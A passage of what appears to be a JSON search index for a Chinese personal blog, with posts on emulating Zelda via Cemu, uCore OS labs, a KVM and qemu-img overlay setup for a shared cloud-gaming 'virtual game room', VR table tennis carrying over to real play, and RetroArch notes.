\u585e\u5c14\u8fbe\u4f20\u8bf4\u8352\u91ce\u4e4b\u606f","text":"<p>\u539f\u795e PC \u516c\u6d4b\u65f6\uff0c\u51fa\u4e8e\u5174\u8da3\u4e0b\u8f7d\u6e38\u73a9\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u81ea\u5df1\u7684\u7535\u8111\u5e26\u4e0d\u52a8 1080p \u7684\u753b\u8d28\uff0c\u800c\u5ba4\u53cb\u7684\u53f0\u5f0f\u673a\u5219\u6beb\u65e0\u538b\u529b\u3002\u7a81\u7136\u60f3\u5230\u8fd9\u79cd\u914d\u7f6e\u662f\u5426\u53ef\u4ee5\u5e26\u5f97\u52a8 cemu \u6a21\u62df\u5668\u7248\u7684\u8d5b\u5c14\u8fbe\u8352\u91ce\u4e4b\u606f\u3002\u7ecf\u8fc7\u5b9e\u8df5\u540e\u53d1\u73b0\u786e\u5b9e\u53ef\u4ee5\u4fdd\u6301 1080p 30 \u5e27\u3002\u800c\u4e14\u6211\u4e5f\u53d1\u73b0 cemu \u4ece v1.18 \u7248\u672c\u5f15\u5165\u4e86\u5f02\u6b65\u7f16\u8bd1\u7684\u529f\u80fd\uff0c\u5927\u5e45\u63d0\u9ad8\u4e86 vulkan \u7684\u6027\u80fd\u3002\u5728\u5c1d\u8bd5\u540e\uff0c\u6211\u53d1\u73b0\u6211\u7684\u7b14\u7535\u4e5f\u53ef\u4ee5\u5728 1600*900 \u7684\u5206\u8fa8\u7387\u4ee5\u63a5\u8fd1 30 \u5e27\u6e38\u73a9\uff0c\u603b\u4e4b\u5df2\u7ecf\u8d85\u8fc7\u4e86\u53ef\u73a9\u7684\u7a0b\u5ea6\u3002\u7136\u540e\u53c8\u5e2e\u5ba4\u53cb\u7684\u7b14\u7535\u88c5\u4e86\u4e00\u4e0b\uff0c\u4e5f\u53ef\u4ee5\u57fa\u672c\u57fa\u672c\u4fdd\u6301 1080p 30 \u5e27\u3002\u4e8e\u662f\u5ba4\u53cb\u5728\u6211\u7684\u5168\u529b\u63a8\u8350\u4e0b\uff0c\u4e00\u8d77\u5f00\u59cb\u4e86\u6109\u5feb\u7684\u6d77\u62c9\u9c81\u6d41\u6c13\u4e4b\u65c5\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#ucore-\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u9a8c","title":"Ucore \u64cd\u4f5c\u7cfb\u7edf\u5b9e\u9a8c","text":"<p>\u6211\u5927\u56db\u7684\u5b9e\u4e60\u662f\u5e2e\u52a9\u8ba1\u7ec4\u8001\u5e08\u4ece\u4e8b\u6559\u6539\u65b9\u9762\u7684\u5de5\u4f5c\u3002\u8ba1\u5212\u80fd\u591f\u5728\u81ea\u5df1\u5199\u7684 cpu \u4e0a\u8fd0\u884c ucore \u7684 mips \u7248\u672c\u3002\u8fd8\u6709\u5176\u5b83\u7684\u5de5\u4f5c\u662f\u5e2e\u5fd9\u5199\u8ba1\u7ec4\u786c\u7efc\u6307\u5bfc\u4e66\uff0c\u4ee5\u53ca\u8bbe\u8ba1 lg \u90a3\u8fb9\u7684\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u5b9e\u9a8c\uff08cache \u5b9e\u9a8c\uff09\u3002</p> <p>\u5728\u9f99\u82af\u676f\u62ff\u5956\u7684\u540c\u65f6\uff0c\u6211\u4e5f\u6df1\u523b\u610f\u8bc6\u5230\u6211\u4eec\u64cd\u4f5c\u7cfb\u7edf\u65b9\u9762\u77e5\u8bc6\u7684\u6b20\u7f3a\u3002\u56e0\u6b64\u4fbf\u5c1d\u8bd5\u505a\u4e00\u4e0b scl \u8bbe\u8ba1\u7684\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u9a8c\uff0c\u987a\u4fbf\u5e2e\u5fd9\u8fdb\u884c\u8bc4\u4f30\u3002\u56db\u4e2a\u5b9e\u9a8c\u6211\u95f4\u65ad\u5730\u505a\u4e86 4 \u4e2a\u661f\u671f\uff0c\u5927\u7ea6\u4e00\u4e2a\u5b9e\u9a8c\u4e00\u4e2a\u661f\u671f\u3002\u6709\u70b9\u6162\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u671f\u95f4\u65e9\u4e0a 9 \u70b9\u591a\u8d77\uff0c\u901a\u5e38\u53ea\u6709\u4e0b\u5348\u4f1a\u5de5\u4f5c\u3002\u5e76\u4e14\u4e14\u671f\u95f4\u4e5f\u6ca1\u6709\u5b8c\u5168\u6295\u5165\u5730\u505a\u8fd9\u4ef6\u4e8b\u3002</p> <p>\u505a\u5b9e\u9a8c\u671f\u95f4\u6709\u5199\u4e00\u4e9b\u8bb0\u5f55\uff0c\u6ca1\u6709\u5b9e\u9a8c 4 \u662f\u56e0\u4e3a\u6587\u4ef6\u7cfb\u7edf\u5bf9\u8dd1 mips \u7248\u672c\u7684 ucore \u5f71\u54cd\u4e0d\u5927\uff0c\u4e14\u4ee5\u6211\u7684\u6027\u683c\u8981\u5b8c\u5168\u641e\u61c2\u5185\u5bb9\u6709\u70b9\u591a\uff0c\u56e0\u6b64\u51b3\u5b9a\u4ee5\u540e\u6709\u673a\u4f1a\u518d\u770b\uff0c\u5148\u628a\u5f53\u524d\u8981\u7d27\u7684\u6307\u5bfc\u4e66\u5b8c\u6210\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2022/11/10/2022-11-10-%E8%99%9A%E6%8B%9F%E6%B8%B8%E6%88%8F%E6%88%BF/","title":"\u865a\u62df\u6e38\u620f\u623f","text":"<p>\u865a\u62df\u6e38\u620f\u623f\u7684\u68a6\u60f3\u4f9d\u7136\u5b58\u5728\u2014\u2014\u5171\u4eab\u6211\u7684\u786c\u4ef6\uff0c\u88c5\u6ee1\u6e38\u620f\uff0c\u6709 PC \u6e38\u620f\u548c\u5404\u79cd\u590d\u53e4\u6a21\u62df\u5668\u6e38\u620f\uff0c\u7528\u6237\u4e32\u6d41\u5c31\u80fd\u76f4\u63a5\u73a9\u3002</p> <p>\u60f3\u6cd5\u6765\u6e90</p> <p>\u4e3b\u8981\u6765\u6e90\u4e8e\u8d85\u7ea7\u5c0f\u6840\u7684\u7ebf\u4e0b\u9884\u7ea6\u7684\u5b9e\u9645\u6e38\u620f\u623f\u3002\u867d\u7136\u6211\u80af\u5b9a\u6ca1\u6709\u8fd9\u4e48\u591a\u4eba\u529b\u7269\u529b\u8d22\u529b\uff0c\u4f46\u662f\u4ee5\u4e91\u6e38\u620f\u7684\u65b9\u5f0f\uff0c\u8bf4\u4e0d\u5b9a\u53ef\u4ee5\u3002\u5206\u4eab\u81ea\u5df1\u559c\u6b22\u7684\u4e1c\u897f\u7ed9\u5927\u5bb6\u7684\u4e50\u8da3\u662f\u76f8\u540c\u7684\u3002</p> <p></p> <p>\u6280\u672f\u8def\u7ebf\uff0c\u4e3b\u8981\u9700\u8981\u89e3\u51b3\u4ee5\u4e0b\u95ee\u9898</p> <ul> <li>\u7cfb\u7edf\uff1a\u670d\u52a1\u5728\u4ec0\u4e48\u4e0a\u9762\u8fd0\u884c</li> <li>\u7f51\u7edc\uff1a\u7528\u6237\u901a\u8fc7\u4ec0\u4e48\u7f51\u7edc\u8fde\u63a5<ul> <li>\u65b9\u6848<ul> <li>zerotier, tailscale</li> <li>\u81ea\u5efa VPN\uff0c\u57fa\u4e8e wireguard</li> <li>\u516c\u7f51\uff08v4 \u6216 v6\uff09</li> </ul> </li> </ul> </li> <li>\u4e32\u6d41\uff1a\u4e32\u6d41\u8f6f\u4ef6<ul> <li>pacsec</li> <li>sunshine + moonlight</li> </ul> </li> <li>\u6e38\u620f<ul> <li>PC \u6e38\u620f</li> <li>\u590d\u53e4\u6a21\u62df\u5668\u524d\u7aef</li> </ul> </li> </ul>","tags":["\u6e38\u620f\u623f","qemu","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E4%B8%AA%E4%BA%BA/2022/11/10/2022-11-10-%E8%99%9A%E6%8B%9F%E6%B8%B8%E6%88%8F%E6%88%BF/#\u65b9\u6848-before-2024","title":"\u65b9\u6848 before 2024","text":"<ul> <li>\u7cfb\u7edf<ul> <li>KVM \u865a\u62df\u673a + qcow2  \u78c1\u76d8</li> <li>PVE \u521b\u5efa\u4e00\u4e2a\u4e13\u95e8\u7684 windows \u865a\u62df\u673a\u3002\u901a\u8fc7 overlay \u6280\u672f\uff0c\u6bcf\u6b21\u8fd0\u884c\u540e\u53ef\u4ee5\u5c06\u7cfb\u7edf\u76d8\u6062\u590d\u5230\u521d\u59cb\u72b6\u6001</li> </ul> </li> <li>\u7f51\u7edc<ul> <li>\u4f7f\u7528 zerotier \u521b\u5efa\u4e00\u4e2a\u865a\u62df\u7f51\u7edc</li> </ul> </li> <li>\u4e32\u6d41<ul> <li>sunshine + moonlight</li> </ul> </li> </ul> <p>\u6253\u7b97\u5f04\u591a\u4e2a windows \u865a\u62df\u673a\uff0c\u5206\u4eab\u7ed9 guest\u3002</p> <p>\u597d\u5904</p> <ul> <li>pcie 4.0 \u7684\u56fa\u6001\u4f5c\u7cfb\u7edf (6000MB \u7684\u8bfb\u5199\uff09</li> <li>Ryzen 5800x + 16GB \u5185\u5b58</li> <li>\u5171\u4eab\u9ad8\u6027\u80fd\u663e\u5361\uff08\u76ee\u524d\u4e3a 1060 3G\uff09</li> </ul> <p>\u5177\u4f53</p> <ul> <li>\u6240\u6709 windows \u865a\u62df\u673a\u7684 C \u76d8\u5171\u7528\u4e00\u4e2a\u57fa\u672c\u955c\u50cf<ul> <li>\u865a\u62df\u673a\u7684\u4fee\u6539\u5173\u673a\u540e\u4e0d\u4fdd\u5b58</li> </ul> </li> <li>\u6240\u6709 windows \u865a\u62df\u673a\u5171\u4eab 2TB \u7684\u6e38\u620f\u76d8<ul> <li>\u666e\u901a\u7528\u6237\u5173\u673a\u540e\uff0c\u6570\u636e\u4e0d\u4fdd\u5b58</li> <li>\u7ba1\u7406\u5458\u865a\u62df\u673a\u5bf9\u5176\u4fee\u6539\u53ef\u4ee5\u4fdd\u5b58</li> </ul> </li> <li>\u4e00\u4e2a\u5b58\u50a8\u76d8\uff0c50GB\u3002\u6570\u636e\u79c1\u6709\u5e76\u8fdb\u884c\u4fdd\u5b58</li> </ul> <p>\u5b9e\u73b0</p> <ul> <li>\u901a\u8fc7 COW \u6587\u4ef6\u7cfb\u7edf\u7684 overlay \u6280\u672f\uff0c\u5728 base \u955c\u50cf\u4e0a\u521b\u5efa\u4e00\u4e2a overlay \u955c\u50cf\u3002\u4e4b\u540e\u5220\u9664 overlay \u5373\u53ef\u56de\u9000\u5230\u57fa\u7840\u72b6\u6001\u3002</li> </ul>","tags":["\u6e38\u620f\u623f","qemu","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E4%B8%AA%E4%BA%BA/2022/11/10/2022-11-10-%E8%99%9A%E6%8B%9F%E6%B8%B8%E6%88%8F%E6%88%BF/#\u955c\u50cf\u7ba1\u7406","title":"\u955c\u50cf\u7ba1\u7406","text":"<p>qemu-img overlay: https://kashyapc.fedorapeople.org/virt/lc-2012/snapshots-handout.html</p> <pre><code>#/var/lib/libvirt/images\n\nwin10-base.qcow2 --&gt; win10-basic.qcow2 --&gt;  overlay-win10-1.qcow2\n\noverlay-game1-1.qcow2\n\ndisk-1.qcow2\n\n\n#C, windows system\nqemu-img create -f qcow2 -F qcow2 -b /var/lib/libvirt/images/win10-basic.qcow2 overlay-win10-1.qcow2\n#E, games\nqemu-img create -f qcow2 -F qcow2 -b /mnt/Disk3/win10-game1.qcow2 overlay-game1-1.qcow2\n</code></pre> <ul> <li>win10-system: 150G<ul> <li>/mnt/VM-Pool/win10.qcow2</li> </ul> </li> <li>disk-life: 200G<ul> <li>/mnt/VM-Pool/disk-life.qcow2</li> </ul> </li> <li>disk-game: 2TB<ul> <li>/mnt/Disk3/win10-game1.qcow2</li> </ul> </li> </ul>","tags":["\u6e38\u620f\u623f","qemu","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E4%B8%AA%E4%BA%BA/2022/11/10/2022-11-10-%E8%99%9A%E6%8B%9F%E6%B8%B8%E6%88%8F%E6%88%BF/#\u65b9\u6848-2024","title":"\u65b9\u6848 2024","text":"<p>\u53d1\u73b0\u4e86\u5b8c\u7f8e\u5951\u5408\u4e91\u6e38\u620f\u7684\u9879\u76ee games-on-whales/wolf: Stream virtual desktops and games running in Docker (github.com)</p> <ul> <li>\u7cfb\u7edf<ul> <li>docker \u5bb9\u5668\uff08\u57fa\u4e8e wolf\uff09</li> </ul> </li> <li>\u7f51\u7edc<ul> <li>\u516c\u7f51 v4 \u6216 v6</li> </ul> </li> <li>\u4e32\u6d41<ul> <li>wolf + moonlight</li> </ul> </li> </ul>","tags":["\u6e38\u620f\u623f","qemu","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/10/28/VR%20%E5%AF%B9%E7%8E%B0%E5%AE%9E%E7%9A%84%E5%BD%B1%E5%93%8D/","title":"VR \u5bf9\u73b0\u5b9e\u7684\u5f71\u54cd","text":"<p>2024 \u5e74 10 \u6708 27 \u65e5\uff0c\u6211\u7ec8\u4e8e\u5b9e\u73b0\u4e86\u5f88\u4e45\u4ee5\u6765\u7684\u4e00\u4e2a\u5fc3\u613f\u2014\u2014\u5728\u73b0\u5b9e\u4e2d\u6253\u4e00\u573a\u4e52\u4e53\u7403\uff0c\u4ee5\u6b64\u68c0\u9a8c\u6211\u5728 VR \u91cc\u6253\u4e86 4 \u4e2a\u591a\u6708\u7403\u540e\u7684\u6c34\u5e73\uff08\u6211\u5728\u6e38\u620f\u4e2d\u76ee\u524d\u5206\u6570\u4e3a 1848\uff09\u3002  Eleven Table Tennis</p> <p>\u521a\u5f00\u59cb\u7684\u4f53\u9a8c\u5c31\u662f\u53d1\u73b0\u7403\u62cd\u597d\u91cd\uff08\u4e5f\u6709\u6211\u7684\u7403\u62cd\u653e\u4e45\u4e86\uff0c\u81ea\u8eab\u5c31\u597d\u50cf\u6bd4\u5bf9\u624b\u7684\u62cd\u5b50\u91cd\u4e00\u70b9\u7684\u7f18\u6545\uff09\uff0c\u51fb\u7403\u65f6\u4e5f\u80fd\u660e\u663e\u611f\u5230\u7403\u7684\u91cd\u91cf\uff08\u649e\u51fb\u611f\uff09\u3002\u800c\u4e14\u51fb\u7403\u7684\u529b\u5ea6\u4e0d\u592a\u4e00\u6837\uff0c\u6211\u7a0d\u5fae\u4e00\u6321\uff0c\u7403\u5c31\u98de\u51fa\u53bb\u4e86\u3002</p> <p>\u4f46\u662f\u795e\u5947\u7684\u662f\uff0c\u6211\u5728 VR \u4e2d\u5b66\u4f1a\u7684\u53d1\u7403\u771f\u7684\u80fd\u591f\u53d1\u51fa\u6765\uff0c\u5e76\u4e14\u6211\u611f\u89c9\u6211\u7684\u53d1\u7403\u597d\u50cf\u8fd8\u633a\u6807\u51c6\uff01\u53d7\u5230\u52a8\u4f5c\u6807\u51c6\u7684\u5f71\u54cd\uff0c\u6211\u5728\u53d1\u7403\u65f6\uff0c\u5c45\u7136\u80fd\u591f\u53d1\u51fa\u6bd4\u6e38\u620f\u4e2d\u66f4\u5f3a\u7684\u65cb\u8f6c\uff01</p> <p>\u4f53\u9a8c</p> <ul> <li>\u521a\u5f00\u59cb\u5f88\u4e0d\u4e60\u60ef\uff0c\u50cf\u662f\u6ca1\u6709\u6253\u8fc7\u4e52\u4e53\u7403\u4f3c\u7684\uff0c\u7403\u4e00\u6321\u5c31\u98de\u4e86</li> <li>\u521a\u5f00\u65f6\u62c9\u7403\u65f6\uff0c\u7403\u603b\u662f\u78b0\u5230\u7403\u62cd\u7684\u8fb9\u7f18\uff0c\u53ef\u80fd\u662f\u6e38\u620f\u4e2d\u7403\u62cd\u4f4d\u7f6e\u6620\u5c04\u4e0d\u4e00\u6837\u5bfc\u81f4\u7684</li> <li>\u53d1\u7403\u771f\u7684\u5feb\u4e50\uff0c\u5f88\u5bb9\u6613\u5c31\u80fd\u591f\u4f53\u4f1a\u5230\uff0c\u5782\u76f4\u629b\u7403\uff0c\u7403\u843d\u4e0b\uff0c\u624b\u81c2\u65cb\u8f6c\u6469\u64e6\u7684\u65f6\u673a\u3002\u51e0\u6b21\u5c1d\u8bd5\u540e\uff0c\u6253\u51fa\u4e86\u6211\u4ee5\u524d\u6253\u4e0d\u51fa\u7684\u5f3a\u529b\u4fa7\u65cb\u53d1\u7403\u3002</li> <li>\u6e38\u620f\u4e2d\u5b66\u4f1a\u7684\u653e\u9ad8\u7403\u5728\u73b0\u5b9e\u4e2d\u4e5f\u57fa\u672c\u80fd\u65bd\u5c55\u51fa\u6765\u3002\u8fd8\u6709\u6b65\u4f10\uff0c\u9632\u5b88\u80fd\u529b\u90fd\u5927\u5927\u63d0\u5347</li> <li>\u5728\u73b0\u5b9e\u4e2d\u7531\u4e8e\u611f\u89c9\u5230\u62cd\u5b50\u53d8\u5f97\u5f88\u91cd\uff0c\u4e2d\u6307\u4e5f\u88ab\u78e8\u7834\u4e86\u4e00\u4e2a\u8327\uff0c\u56e0\u6b64\u63e1\u62cd\u65b9\u5f0f\u4f7f\u7528\u4e86\u4ee5\u524d\u6ca1\u6709\u8fc7\u7684\u4e2d\u6307\u548c\u62c7\u6307\u5939\u4f4f\u62cd\u9762\u7684\u65b9\u5f0f\uff0c\u62cd\u67c4\u57fa\u672c\u4e0d\u63e1\u4f4f\uff08\u4e5f\u5c31\u662f\u4e00\u79cd\u5229\u4e8e\u53d1\u65cb\u7403\u7684\u65b9\u5f0f\uff09\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u52a0\u6469\u64e6\uff0c\u62c9\u8d77\u5f88\u591a\u6bd4\u8f83\u4f4e\u7684\u7403\u3002\u5178\u578b\u5c31\u662f\u6211\u53d1\u4e00\u4e2a\u4e0b\u65cb\uff0c\u5bf9\u8fb9\u6413\u8fc7\u6765\uff0c\u6211\u76f4\u63a5\u5c31\u53ef\u4ee5\u4fa7\u8eab\u6b63\u624b\u7206\u62c9\u3002</li> <li>\u53cd\u624b\u4e5f\u6253\u51fa\u4e86\u5f88\u591a\u6f02\u4eae\u7684\u53cd\u62c9\uff0c\u611f\u89c9\u5c31\u662f\u52a8\u4f5c\u6807\u51c6\u4e86\uff0c\u56e0\u6b64\u4e0d\u4f1a\u50cf\u4ee5\u524d\u90a3\u6837\u4e71\u62c9\u3002</li> <li>\u73b0\u5b9e\u4e2d\u6253\u7403\u8c8c\u4f3c\u6bd4 VR \u4e2d\u7d2f\uff0c\u6253\u4e86 1 \u5c0f\u65f6\uff0c\u7ed3\u679c\u7b2c\u4e8c\u5929\u817f\u5c45\u7136\u6709\u70b9\u9178\u3002\u800c\u6211 VR \u4e5f\u6253\u8fc7 1 \u4e2a\u591a\u5c0f\u65f6\uff0c\u5e76\u6ca1\u6709\u8fd9\u6b21\u90a3\u4e48\u7d2f\uff08\u54e6\uff0c\u53ef\u80fd\u662f\u73b0\u5b9e\u9700\u8981\u6361\u7403\uff09</li> </ul> <p>\u603b\u7ed3</p> <ul> <li>\u603b\u4e4b\u6700\u5927\u7684\u53d8\u5316\uff0c\u5c31\u662f\u53d1\u7403\uff0c\u62c9\u7403\uff0c\u52a8\u4f5c\u90fd\u5f00\u59cb\u53d8\u5f97\u6807\u51c6\u3002\u53d8\u5f97\u6807\u51c6\u540e\uff0c\u5bf9\u62cd\u5b50\u89e6\u7403\u53d1\u529b\u7684\u65f6\u673a\u53d8\u5f97\u66f4\u52a0\u6e05\u695a\u4e86</li> <li>\u7b2c\u4e00\u6b21\u6253 VR \u4e52\u4e53\u7403\u65f6\u89c9\u5f97\u771f\u7684\u592a\u771f\u5b9e\u4e86\uff0c\u611f\u89c9\u6a21\u62df\u4e86\u73b0\u5b9e 90% \u7684\u771f\u5b9e\u5ea6\u3002\u8fd9\u6b21\u73b0\u5b9e\u4e2d\u6253\u5b8c\u518d\u53bb VR \u6253\u65f6\uff0c\u611f\u89c9\u786e\u5b9e\u5f88\u591a\u5730\u65b9\u90fd\u7b80\u5316\u4e86\u3002\u4e3b\u8981\u662f\u529b\u91cf\u4e0d\u540c\uff0c\u6e38\u620f\u91cc\u7684\u62cd\u5b50\u5f39\u6027\u3001\u6469\u64e6\u548c\u73b0\u5b9e\u8fd8\u662f\u6709\u533a\u522b\u3002\u7efc\u5408\u4f53\u9a8c\u4e0b\u6765\uff0c\u611f\u89c9\u771f\u5b9e\u6027\u53ea\u6709 70% \u4e86\u3002</li> </ul> <p>p.s \u4e00\u4e2a\u5947\u602a\u7684\u5730\u65b9\uff0c\u6211\u4ee5\u524d\u6700\u719f\u7ec3\u7684\u4e00\u79cd\u53d1\u7403\u2014\u2014\u53f3\u4fa7\u4e0b\u65cb\uff0c\u5c45\u7136\u5b8c\u5168\u4e0d\u4f1a\u4e86\u3002\u6211\u5728\u6e38\u620f\u4e2d\u8fd9\u4e2a\u53d1\u7403\u4e5f\u662f\u7ecf\u5e38\u7528\u7684\uff0c\u4f46\u662f\u5728\u73b0\u5b9e\u4e2d\uff0c\u5c31\u662f\u53d1\u5f97\u5f88\u522b\u626d\uff0c\u65cb\u8f6c\u5b8c\u5168\u4e0d\u591f\u3002</p>","tags":["vr","eleven"]},{"location":"%E4%B8%AA%E4%BA%BA/2024/10/28/VR%20%E5%AF%B9%E7%8E%B0%E5%AE%9E%E7%9A%84%E5%BD%B1%E5%93%8D/#\u5bf9\u672a\u6765\u7684\u7545\u60f3","title":"\u5bf9\u672a\u6765\u7684\u7545\u60f3","text":"<p>\u603b\u4e4b\u8fd9\u786e\u5b9e\u662f\u4e00\u6b21\u5f88\u7279\u522b\u7684\u4f53\u9a8c\uff0c\u5c31\u50cf\u5200\u5251\u795e\u57df\u4e2d\u7684 kirito \u56de\u5230\u73b0\u5b9e\u4e16\u754c\u540e\uff0c\u771f\u7684\u5b66\u4f1a\u4e86\u6e38\u620f\u4e2d\u7684\u5251\u672f\uff0c\u5e76\u4e14\u8eab\u4f53\u7d20\u8d28\u50cf\u6e38\u620f\u52a0\u70b9\u4e00\u6837\uff0c\u529b\u91cf\u3001\u654f\u6377\u90fd\u5f97\u5230\u63d0\u9ad8\uff08\u8fd9\u8fd8\u662f\u5728\u4ed6\u73b0\u5b9e\u8eab\u4f53\u6ca1\u6709\u5b9e\u9645\u953b\u70bc\u7684\u60c5\u51b5\u4e0b\uff09</p> <p>\u6211\u5728\u6e38\u620f\u4e2d\u7684\u7ec3\u4e60\uff0c\u771f\u7684\u5bf9\u6211\u5728\u73b0\u5b9e\u4e2d\u4ea7\u751f\u4e86\u5f88\u5927\u7684\u5f71\u54cd\u3002\u5f53\u7136\u8fd9\u66f4\u50cf\u662f\u4e00\u79cd\u5bf9\u5927\u8111\u7684\u953b\u70bc\uff0c\u5982\u679c\u865a\u62df\u548c\u73b0\u5b9e\u6709\u4e0d\u4e00\u81f4\u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u8fd9\u79cd\u953b\u70bc\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e00\u79cd\u5927\u8111\u9519\u89c9\u6216\u8005\u6df7\u4e71\u3002\u4f46\u662f\u5728\u4e00\u81f4\u7684\u60c5\u51b5\u4e0b\uff0c\u6e38\u620f\u4e2d\u7684\u7ecf\u9a8c\u786e\u5b9e\u53ef\u4ee5\u8f6c\u6362\u6210\u73b0\u5b9e\u7684\u7ecf\u9a8c\u3002</p> <p>\u90a3\u4e48\u4e00\u4e2a\u6709\u7528\u7684\u4f8b\u5b50\u81ea\u7136\u662f\u5728 VR \u4e2d\u953b\u70bc\u90a3\u4e9b\u73b0\u5b9e\u4e2d\u6bd4\u8f83\u56f0\u96be\u7684\u4efb\u52a1\uff0c\u7b80\u5355\u7684\u6bd4\u5982\u5f00\u8f66\uff0c\u56f0\u96be\u7684\u6bd4\u5982\u5f00\u98de\u673a\u3002\u5b9e\u9645\u4e0a\u8fd9\u4e9b\u90fd\u662f\u6709\u73b0\u5b9e\u7684\u4f8b\u5b50\u7684\u3002</p> <p>\u611f\u89c9 VR \u7684\u5e94\u7528\u9664\u4e86\u6a21\u62df\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5b66\u4e60\u5916\u8bed\u53e3\u8bed\u7b49\u5e94\u7528\u3002</p> <p>\u603b\u4e4b\uff0c\u6211\u5bf9 VR \u7684\u524d\u666f\u8fd8\u662f\u6709\u7740\u5f88\u9ad8\u671f\u5f85\u7684\u3002</p>","tags":["vr","eleven"]},{"location":"%E4%B8%AA%E4%BA%BA/2019/09/11/hello-world/","title":"\u5e8f\u7ae0","text":"<p>\u5199\u535a\u5ba2\u5728\u6211\u770b\u6765\u5c31\u72b9\u5982\u521b\u5efa\u4e00\u4e2a\u5c5e\u4e8e\u81ea\u5df1\u7684\u79d8\u5bc6\u57fa\u5730\uff0c \u90a3\u662f\u4e00\u4e2a\u5c5e\u4e8e\u81ea\u5df1\u5185\u5fc3\u7684\u573a\u6240\u3002</p> <p>\u5076\u5c14\u671f\u5f85\u7740\u6709\u4eba\u8bef\u5165\u8fd9\u91cc\uff0c \u901a\u8fc7\u6587\u5b57\u5411\u4ed6\u4eec\u8868\u8fbe\u771f\u5b9e\u7684\u81ea\u5df1\u3002</p>","tags":["\u5e8f\u7ae0"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/","title":"\u590d\u53e4\u6a21\u62df\u5668\u524d\u7aef","text":"","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#retroarch","title":"retroarch","text":"<p>RetroArch Starter Guide \u2013 Retro Game Corps</p> <p>retroarch \u662f\u4e00\u4e2a\u6a21\u62df\u5668\u524d\u7aef\uff0c\u4e0d\u540c\u7684\u6a21\u62df\u5668\u4ee5 core \u7684\u5f62\u5f0f\u5d4c\u5165 retro\u3002retroarch \u76f8\u5bf9\u4e8e\u5355\u72ec\u7684\u6a21\u62df\u5668\u6765\u8bf4\u597d\u5904\u5982\u4e0b</p> <ul> <li>\u8de8\u5e73\u53f0\u3002retroarch \u652f\u6301\u975e\u5e38\u591a\u7684\u5e73\u53f0\u3002\u7531\u4e8e core \u662f\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u5f62\u5f0f\u5d4c\u5165 retroarch \u7684\uff0c\u76f8\u5f53\u4e8e\u89e3\u51b3\u4e86\u4e0d\u540c core \u7684\u8de8\u5e73\u53f0\u95ee\u9898\u3002</li> <li>\u652f\u6301\u5168\u5c40\u7684\u6309\u952e\u6620\u5c04\u3002\u4e0d\u7528\u4e3a\u6bcf\u4e2a\u6a21\u62df\u5668\u8bbe\u7f6e\u624b\u67c4\uff0c\u5feb\u6377\u952e\u7b49\u7b49\u914d\u7f6e\u3002</li> <li>shader and filters\u3002\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u7279\u522b\u7684\u89c6\u89c9\u6548\u679c\uff0c\u6bd4\u5982</li> </ul>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>RetroArch \u8857\u673a\u6a21\u62df\u6559\u7a0b\u3010\u4eb2\u6d4b\u6709\u6548\u3011 - \u7b80\u4e66 (jianshu.com) EmuELEC \u4e2d\u6587\u7f51 - EmuELEC \u4f7f\u7528\u6307\u5357\u4e94\u4e4b\u8857\u673a\u6a21\u62df\u5668\u4f7f\u7528\u7b80\u4ecb EmuELEC \u4e2d\u6587\u7f51 - EmuELEC \u4f7f\u7528\u6307\u5357\u4e00\u4e4b\u65b0\u624b\u5feb\u901f\u4e0a\u624b\u6307\u5357</p>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#shader","title":"shader","text":"<p>\u3010\u5728LCD/OLED\u4e0a\u6b63\u786e\u663e\u793a\u8001\u6e38\u620f\u3011\u7b2c\u4e8c\u5f39\u2014\u2014\u81ea\u7814\u6ee4\u955c\u3010\u534a\u8c03\u5706\u70b9\u3011_\u5355\u673a\u6e38\u620f\u70ed\u95e8\u89c6\u9891 (bilibili.com)</p>","tags":["retroarch","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/09/29/%E5%A4%8D%E5%8F%A4%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%89%8D%E7%AB%AF/#retroarch-\u8bbe\u7f6e","title":"Retroarch \u8bbe\u7f6e","text":"<p>RetroArch Starter Guide \u2013 Retro Game 